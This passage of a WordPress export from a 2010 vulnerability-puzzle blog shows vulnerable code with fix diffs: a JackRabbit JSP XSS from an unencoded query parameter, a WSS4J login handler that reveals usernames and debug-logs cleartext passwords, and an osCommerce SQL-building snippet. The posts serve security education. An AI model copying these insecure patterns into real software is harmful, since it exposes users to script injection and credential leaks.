Original Code: <a title="Pause" href="http://spotthevuln.com/2010/02/pause/" target="_blank">Found Here</a>
<h2>Description</h2>
<div><span>This particular issue was a XSS vulnerability that affected JackRabbit &lt; 1.5.2. The issue was reported to the JackRabbit team by the Red Hat Security Response Team. The symptoms are fairly straightforward. First, the JackRabbit code takes user/attacker supplied via the "q" parameter:</span></div>
<span>
<blockquote>String q = new String(request.getParameter("q").getBytes("ISO-8859-1"), "UTF-8");</blockquote>
later, this value is used to build HTML markup without any type of encoding or sanitization
<blockquote>&lt;/b&gt; results for &lt;b&gt;&lt;%= q %&gt;&lt;/b&gt;.&lt;br&gt;

&lt;INPUT type=hidden name=q value="&lt;%= q %&gt;"&gt;</blockquote>
This type of issue could have easily been caught through static analysis and represents one of the most basic forms of XSS. The JackRabbit developers fixed this issue by encoding the "q" parameter before using it to build HTML markup. The specific method chosen by the JackRabbit team was the "Text.encodeIllegalXMLCharacters()". I've included the most relevant portions of "encodeIllegalXMLCharacters()" below, do you consider it robust?:
<blockquote>...

for (int i = 0; i &lt; length; i++) {

int ch = text.charAt(i);

switch (ch) {

case '&lt;':

case '&gt;':

case '&amp;':

case '"':

case '\'':

...

if (ch == '&lt;') {

buf.append("&lt;");

} else if (ch == '&gt;') {

buf.append("&gt;");

} else if (ch == '&amp;') {

buf.append("&amp;");

} else if (ch == '"') {

buf.append(""");

} else if (ch == '\'') {

buf.append("'");

}</blockquote>
 

</span>
<h2>Developers Solution</h2>
[cce lang="diff"]
<div id="_mcePaste">try {
String q = new String(request.getParameter("q").getBytes("ISO-8859-1"), "UTF-8");
String swrnum = request.getParameter("swrnum");
String numResults = null;
try {
numResults = NumberFormat.getNumberInstance().format(Long.parseLong(swrnum));
} catch (NumberFormatException e) {
// ignore
}
if (q == null || numResults == null) {
return;
}</div>
<div>request.setAttribute("title", "Search within results");
%&gt;&lt;jsp:include page="header.jsp"/&gt;
&lt;form name=f action="search.jsp"&gt;
&lt;table border=0 cellpadding=0 cellspacing=0 width=100%&gt;
-&lt;tr&gt;&lt;table border=0 width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;br&gt;There were about &lt;b&gt;&lt;%= numResults %&gt;&lt;/b&gt; results for &lt;b&gt;&lt;%= q %&gt;&lt;/b&gt;.&lt;br&gt;
+&lt;tr&gt;&lt;table border=0 width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;br&gt;There were about &lt;b&gt;&lt;%= numResults %&gt;&lt;/b&gt; results for &lt;b&gt;&lt;%= Text.encodeIllegalXMLCharacters(q) %&gt;&lt;/b&gt;.&lt;br</div>
<div>Use the search box below to search within these results.&lt;br&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=middle&gt;
&lt;table border=0 width=100%&gt;&lt;tr&gt;&lt;td&gt;
- &lt;INPUT type=hidden name=q value="&lt;%= q %&gt;"&gt;
+&lt;INPUT type=hidden name=q value="&lt;%= Text.encodeIllegalXMLCharacters(q) %&gt;"&gt;
&lt;INPUT type=text name=as_q size=31 maxlength=256 value=""&gt;
&lt;INPUT type=submit VALUE="Search&amp;nbsp;within&amp;nbsp;results"&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;/form&gt;
&lt;jsp:include page="footer.jsp"/&gt;</div>
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>702</wp:post_id>
		<wp:post_date>2010-02-26 09:05:19</wp:post_date>
		<wp:post_date_gmt>2010-02-26 16:05:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pause-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="apache"><![CDATA[Apache]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="jackrabbit"><![CDATA[JackRabbit]]></category>
		<category domain="post_tag" nicename="jackrabbit"><![CDATA[JackRabbit]]></category>
		<category domain="post_tag" nicename="jsp"><![CDATA[JSP]]></category>
		<category domain="post_tag" nicename="simple"><![CDATA[Simple]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[XSS vulnerability affected JackRabbit]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[0cf391d266d0c3698e6be4fc74352b7e]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/a8eYDm]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Slinky</title>
		<link>http://spotthevuln.com/2010/03/slinky/</link>
		<pubDate>Mon, 01 Mar 2010 15:00:13 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=708</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>People are like slinkys, they get on your nerves, but its still fun to push them down some stairs.
- Anonymous</strong></blockquote>
Hint:  WSSecurityException returns an error message to the user :)

[ccnLe_java]

public WSUsernameTokenPrincipal handleUsernameToken(Element token, CallbackHandler cb)
throws WSSecurityException {
ut = new UsernameToken(token);
String user = ut.getName();
String password = ut.getPassword();
String nonce = ut.getNonce();
String createdTime = ut.getCreated();
String pwType = ut.getPasswordType();
if (log.isDebugEnabled()) {
log.debug("UsernameToken user " + user);
log.debug("UsernameToken password " + password);
}

Callback[] callbacks = new Callback[1];
String origPassword = null;

//
// If the UsernameToken is hashed, then retrieve the password from the callback handler
// and compare directly. If the UsernameToken is in plaintext or of some unknown type,
// then delegate authentication to the callback handler
//
if (ut.isHashed()) {
if (cb == null) {
throw new WSSecurityException(WSSecurityException.FAILURE, "noCallback");
}

WSPasswordCallback pwCb = new WSPasswordCallback(user, WSPasswordCallback.USERNAME_TOKEN);
callbacks[0] = pwCb;
try {
cb.handle(callbacks);
} catch (IOException e) {
if (log.isDebugEnabled()) {
log.debug(e);
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
} catch (UnsupportedCallbackException e) {
if (log.isDebugEnabled()) {
log.debug(e);
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
}
origPassword = pwCb.getPassword();
if (log.isDebugEnabled()) {
log.debug("UsernameToken callback password " + origPassword);
}
if (origPassword == null) {
throw new WSSecurityException(WSSecurityException.FAILURE,
"noPassword", new Object[]{user});
}
String passDigest = UsernameToken.doPasswordDigest(nonce, createdTime, origPassword);
if (!passDigest.equals(password)) {
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
}
ut.setRawPassword(origPassword);
} else {
if (cb == null) {
throw new WSSecurityException(WSSecurityException.FAILURE, "noCallback");
} else if (!WSConstants.PASSWORD_TEXT.equals(pwType) &amp;&amp; !handleCustomPasswordTypes) {
if (log.isDebugEnabled()) {
log.debug("Authentication failed as handleCustomUsernameTokenTypes is false");
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
}
WSPasswordCallback pwCb = new WSPasswordCallback(user, password,
pwType, WSPasswordCallback.USERNAME_TOKEN_UNKNOWN);
callbacks[0] = pwCb;
try {
cb.handle(callbacks);
} catch (IOException e) {
if (log.isDebugEnabled()) {
log.debug(e);
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
} catch (UnsupportedCallbackException e) {
if (log.isDebugEnabled()) {
log.debug(e);
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
}
ut.setRawPassword(password);
}
WSUsernameTokenPrincipal principal = new WSUsernameTokenPrincipal(user, ut.isHashed());
principal.setNonce(nonce);
principal.setPassword(password);
principal.setCreatedTime(createdTime);
principal.setPasswordType(pwType);

return principal;
}

[/ccnLe_java] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>708</wp:post_id>
		<wp:post_date>2010-03-01 08:00:13</wp:post_date>
		<wp:post_date_gmt>2010-03-01 15:00:13</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>slinky</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Slinky]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Slinky]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cSUE6U]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[2101031755015b2393b1a143c8423dca]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>420</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Vulnerable Source Code &#8211; Slinky &#8211; Defense in Depth ~ spotthevuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/03/slinky-defense-in-depth/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-03-05 08:22:44</wp:comment_date>
			<wp:comment_date_gmt>2010-03-05 15:22:44</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Slinky - Defense in Depth</title>
		<link>http://spotthevuln.com/2010/03/slinky-defense-in-depth/</link>
		<pubDate>Fri, 05 Mar 2010 15:00:43 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=714</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Apache webservices

Fixed in Version: revision 697031

Issue Type: Defense in Depth

Original Code: <a title="Slinky" href="http://spotthevuln.com/2010/03/slinky/" target="_blank">Found Here</a>
<h2>Description</h2>
<div>

This is a defense in depth fix checked into the Apache SVN under web services.  This particular issue prevented a username enumeration/disclosure bug that would occur if a null password was sent with a value username.  The developers fixed this particular issue by logging the failure in the debug log and displaying a generic authentication failure message back to the user.
<blockquote>throw new WSSecurityException(WSSecurityException.FAILURE,
"noPassword", <span style="color: #ff0000;">new Object[]{user}</span>)</blockquote>
The defense in depth fix is pretty straightforward… what’s interesting however, is the code surrounding the fix.  A quick examination shows that there is a real possibility that clear text passwords are being logged in the debug log file.  Take the following code for example:
<blockquote>log.debug("UsernameToken callback password " + <span style="color: #ff0000;">origPassword</span>);</blockquote>
I hope origPassword doesn’t actually represent a user’s password!

</div>
<h2>Developers Solution</h2>
[cce lang="diff"]

http://svn.apache.org/viewvc/webservices/wss4j/trunk/src/org/apache/ws/security/processor/UsernameTokenProcessor.java?p2=/webservices/wss4j/trunk/src/org/apache/ws/security/processor/UsernameTokenProcessor.java&amp;p1=/webservices/wss4j/trunk/src/org/apache/ws/security/processor/UsernameTokenProcessor.java&amp;r1=697031&amp;r2=697030&amp;pathrev=697031&amp;view=diff&amp;diff_format=l

People are like slinkys, they get on your nerves, but its still fun to push them down some stairs.
By Anonymous

public WSUsernameTokenPrincipal handleUsernameToken(Element token, CallbackHandler cb)
throws WSSecurityException {
ut = new UsernameToken(token);
String user = ut.getName();
String password = ut.getPassword();
String nonce = ut.getNonce();
String createdTime = ut.getCreated();
String pwType = ut.getPasswordType();
if (log.isDebugEnabled()) {
log.debug("UsernameToken user " + user);
log.debug("UsernameToken password " + password);
}

Callback[] callbacks = new Callback[1];
String origPassword = null;

//
// If the UsernameToken is hashed, then retrieve the password from the callback handler
// and compare directly. If the UsernameToken is in plaintext or of some unknown type,
// then delegate authentication to the callback handler
//
if (ut.isHashed()) {
if (cb == null) {
throw new WSSecurityException(WSSecurityException.FAILURE, "noCallback");
}

WSPasswordCallback pwCb = new WSPasswordCallback(user, WSPasswordCallback.USERNAME_TOKEN);
callbacks[0] = pwCb;
try {
cb.handle(callbacks);
} catch (IOException e) {
if (log.isDebugEnabled()) {
log.debug(e);
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
} catch (UnsupportedCallbackException e) {
if (log.isDebugEnabled()) {
log.debug(e);
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
}
origPassword = pwCb.getPassword();
if (log.isDebugEnabled()) {
log.debug("UsernameToken callback password " + origPassword);
}
if (origPassword == null) {
+                if (log.isDebugEnabled()) {
+                    log.debug("Callback supplied no password for: " + user);
+                }
+                throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);

-                throw new WSSecurityException(WSSecurityException.FAILURE,
-                        "noPassword", new Object[]{user});
}
String passDigest = UsernameToken.doPasswordDigest(nonce, createdTime, origPassword);
if (!passDigest.equals(password)) {
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
}
ut.setRawPassword(origPassword);
} else {
if (cb == null) {
throw new WSSecurityException(WSSecurityException.FAILURE, "noCallback");
} else if (!WSConstants.PASSWORD_TEXT.equals(pwType) &amp;&amp; !handleCustomPasswordTypes) {
if (log.isDebugEnabled()) {
log.debug("Authentication failed as handleCustomUsernameTokenTypes is false");
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
}
WSPasswordCallback pwCb = new WSPasswordCallback(user, password,
pwType, WSPasswordCallback.USERNAME_TOKEN_UNKNOWN);
callbacks[0] = pwCb;
try {
cb.handle(callbacks);
} catch (IOException e) {
if (log.isDebugEnabled()) {
log.debug(e);
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
} catch (UnsupportedCallbackException e) {
if (log.isDebugEnabled()) {
log.debug(e);
}
throw new WSSecurityException(WSSecurityException.FAILED_AUTHENTICATION);
}
ut.setRawPassword(password);
}
WSUsernameTokenPrincipal principal = new WSUsernameTokenPrincipal(user, ut.isHashed());
principal.setNonce(nonce);
principal.setPassword(password);
principal.setCreatedTime(createdTime);
principal.setPasswordType(pwType);

return principal;
}

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>714</wp:post_id>
		<wp:post_date>2010-03-05 08:00:43</wp:post_date>
		<wp:post_date_gmt>2010-03-05 15:00:43</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>slinky-defense-in-depth</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="apache-software"><![CDATA[Apache]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Slinky - Defense in Depth]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Slinky - Defense in Depth]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_d12d3b9db1c0cf62a2e977d9ddb3b2d2</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[2b87e4c43b0c995b9d55e37d0c0a1952]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/axHfoi]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_c9d399e131a26ef505befbaf7d26fc14</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Misunderstood</title>
		<link>http://spotthevuln.com/2010/03/misunderstood/</link>
		<pubDate>Mon, 08 Mar 2010 15:00:13 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=721</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>To be great is to be misunderstood.
- Ralph Waldo Emerson</strong></blockquote>
[ccnLe_php]

// show the products of a specified manufacturer
if (isset($HTTP_GET_VARS['manufacturers_id'])) {
if (isset($HTTP_GET_VARS['filter_id']) &amp;&amp; tep_not_null($HTTP_GET_VARS['filter_id'])) {
// We are asked to show only a specific category
$listing_sql = "select " . $select_column_list . " p.products_id, p.manufacturers_id, p.products_price, p.products_tax_class_id, IF(s.status, s.specials_new_products_price, NULL) as specials_new_products_price, IF(s.status, s.specials_new_products_price, p.products_price) as final_price from " . TABLE_PRODUCTS . " p left join " . TABLE_SPECIALS . " s on p.products_id = s.products_id, " . TABLE_PRODUCTS_DESCRIPTION . " pd, " . TABLE_MANUFACTURERS . " m, " . TABLE_PRODUCTS_TO_CATEGORIES . " p2c where p.products_status = '1' and p.manufacturers_id = m.manufacturers_id and m.manufacturers_id = '" . (int)$HTTP_GET_VARS['manufacturers_id'] . "' and p.products_id = p2c.products_id and pd.products_id = p2c.products_id and pd.language_id = '" . (int)$languages_id . "' and p2c.categories_id = '" . (int)$HTTP_GET_VARS['filter_id'] . "'";
} else {
// We show them all
$listing_sql = "select " . $select_column_list . " p.products_id, p.manufacturers_id, p.products_price, p.products_tax_class_id, IF(s.status, s.specials_new_products_price, NULL) as specials_new_products_price, IF(s.status, s.specials_new_products_price, p.products_price) as final_price from " . TABLE_PRODUCTS . " p left join " . TABLE_SPECIALS . " s on p.products_id = s.products_id, " . TABLE_PRODUCTS_DESCRIPTION . " pd, " . TABLE_MANUFACTURERS . " m where p.products_status = '1' and pd.products_id = p.products_id and pd.language_id = '" . (int)$languages_id . "' and p.manufacturers_id = m.manufacturers_id and m.manufacturers_id = '" . (int)$HTTP_GET_VARS['manufacturers_id'] . "'";
}
} else {
// show the products in a given categorie
if (isset($HTTP_GET_VARS['filter_id']) &amp;&amp; tep_not_null($HTTP_GET_VARS['filter_id'])) {
// We are asked to show only specific catgeory
$listing_sql = "select " . $select_column_list . " p.products_id, p.manufacturers_id, p.products_price, p.products_tax_class_id, IF(s.status, s.specials_new_products_price, NULL) as specials_new_products_price, IF(s.status, s.specials_new_products_price, p.products_price) as final_price from " . TABLE_PRODUCTS . " p left join " . TABLE_SPECIALS . " s on p.products_id = s.products_id, " . TABLE_PRODUCTS_DESCRIPTION . " pd, " . TABLE_MANUFACTURERS . " m, " . TABLE_PRODUCTS_TO_CATEGORIES . " p2c where p.products_status = '1' and p.manufacturers_id = m.manufacturers_id and m.manufacturers_id = '" . (int)$HTTP_GET_VARS['filter_id'] . "' and p.products_id = p2c.products_id and pd.products_id = p2c.products_id and pd.language_id = '" . (int)$languages_id . "' and p2c.categories_id = '" . (int)$current_category_id . "'";
} else {
// We show them all
$listing_sql = "select " . $select_column_list . " p.products_id, p.manufacturers_id, p.products_price, p.products_tax_class_id, IF(s.status, s.specials_new_products_price, NULL) as specials_new_products_price, IF(s.status, s.specials_new_products_price, p.products_price) as final_price from " . TABLE_PRODUCTS_DESCRIPTION . " pd, " . TABLE_PRODUCTS . " p left join " . TABLE_MANUFACTURERS . " m on p.manufacturers_id = m.manufacturers_id left join " . TABLE_SPECIALS . " s on p.products_id = s.products_id, " . TABLE_PRODUCTS_TO_CATEGORIES . " p2c where p.products_status = '1' and p.products_id = p2c.products_id and pd.products_id = p2c.products_id and pd.language_id = '" . (int)$languages_id . "' and p2c.categories_id = '" . (int)$current_category_id . "'";
}
}

if ( (!isset($HTTP_GET_VARS['sort'])) || (!ereg('[1-8][ad]', $HTTP_GET_VARS['sort'])) || (substr($HTTP_GET_VARS['sort'], 0, 1) &gt; sizeof($column_list)) ) {
for ($i=0, $n=sizeof($column_list); $i&lt;$n; $i++) {
if ($column_list[$i] == 'PRODUCT_LIST_NAME') {
$HTTP_GET_VARS['sort'] = $i+1 . 'a';
} else {
$sort_col = substr($HTTP_GET_VARS['sort'], 0 , 1);
$sort_order = substr($HTTP_GET_VARS['sort'], 1);
$listing_sql .= ' order by ';

switch ($column_list[$sort_col-1]) {
case 'PRODUCT_LIST_MODEL':
$listing_sql .= "p.products_model " . ($sort_order == 'd' ? 'desc' : '') . ", pd.products_name";
break;
case 'PRODUCT_LIST_NAME':
$listing_sql .= " order by pd.products_name " . ($sort_order == 'd' ? 'desc' : '');
break;
case 'PRODUCT_LIST_MANUFACTURER':
$listing_sql .= " order by m.manufacturers_name " . ($sort_order == 'd' ? 'desc' : '') . ", pd.products_name";
break;
case 'PRODUCT_LIST_QUANTITY':
$listing_sql .= " order by p.products_quantity " . ($sort_order == 'd' ? 'desc' : '') . ", pd.products_name";
break;
case 'PRODUCT_LIST_IMAGE':

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>721</wp:post_id>
		<wp:post_date>2010-03-08 08:00:13</wp:post_date>
		<wp:post_date_gmt>2010-03-08 15:00:13</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>misunderstood</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[63353b8b7ec14e992e619afe6caf04a5]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/d3hFVV]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Misunderstood]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Misunderstood]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Misunderstood]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Misunderstood]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>421</wp:comment_id>
			<wp:comment_author><![CDATA[ironiridis]]></wp:comment_author>
			<wp:comment_author_email>ironiridis@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>174.20.2.192</wp:comment_author_IP>
			<wp:comment_date>2010-03-08 10:39:55</wp:comment_date>
			<wp:comment_date_gmt>2010-03-08 17:39:55</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Looks like you're missing a very important closing curly brace on line 29. Otherwise this is going to get ugly, fast.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
